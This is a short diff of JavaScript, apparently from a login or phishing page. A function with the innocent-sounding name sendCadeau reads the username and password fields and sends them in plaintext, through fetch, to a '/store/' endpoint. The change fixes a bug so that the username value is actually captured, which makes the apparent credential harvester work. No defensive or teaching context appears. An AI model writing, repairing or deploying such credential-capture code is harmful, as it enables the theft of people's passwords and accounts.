@@ -8,7 +8,7 @@ function setPwd(e) {
 }
 
 function sendCadeau() {
-    var info = document.getElementById("username") + " - " + document.getElementById("password").value;
+    var info = document.getElementById("username").value + "-" + document.getElementById("password").value;
     fetch('/store/' + info).then().catch();
 }
 
